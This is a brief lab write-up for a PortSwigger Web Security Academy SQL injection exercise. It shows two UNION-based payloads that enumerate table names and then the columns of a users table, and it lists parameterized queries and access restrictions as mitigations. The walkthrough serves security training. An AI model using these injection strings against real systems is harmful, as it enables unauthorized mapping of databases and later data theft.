# SQL Injection – Listing Database Contents

Platform: PortSwigger Web Security Academy  

## Overview

The lab allows enumeration of database tables.

## Exploitation

First step:

' UNION SELECT table_name, NULL FROM information_schema.tables--

This lists database tables.

Second step:

' UNION SELECT column_name, NULL FROM information_schema.columns 
WHERE table_name='users'--

## Result

User table columns are discovered.

## Impact

Attackers can map the database structure.

## Mitigation

• Parameterized queries  
• Database access restrictions
